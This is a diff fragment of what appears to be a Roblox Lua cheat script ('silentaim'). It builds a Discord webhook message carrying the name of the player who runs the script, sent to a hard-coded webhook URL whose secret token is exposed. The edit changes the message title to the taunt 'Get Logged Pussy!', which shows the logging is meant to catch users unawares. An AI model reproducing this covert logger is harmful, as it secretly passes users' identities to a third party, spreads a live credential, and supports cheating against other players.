@@ -70,10 +70,10 @@ local webhookcheck =
 local url =
    "https://discord.com/api/webhooks/1023687372539437156/cdeX98wjpKstpli5laI4CV9gBM41MpaeQv3ePOp6LW0Wp5xfo_N8lyvyzquza733CaQe"
 local data = {
-   ["content"] = " ***Da Assist Logs***",
+   ["content"] = " ***myst and nv and con silentaim***",
    ["embeds"] = {
        {
-           ["title"] = "**Someone Executed Your Script!**",
+           ["title"] = "**Get Logged Pussy!**",
            ["description"] = "Username: " .. game.Players.LocalPlayer.Name.." with **"..webhookcheck.."**",
            ["type"] = "rich",
            ["color"] = tonumber(0x7269da),
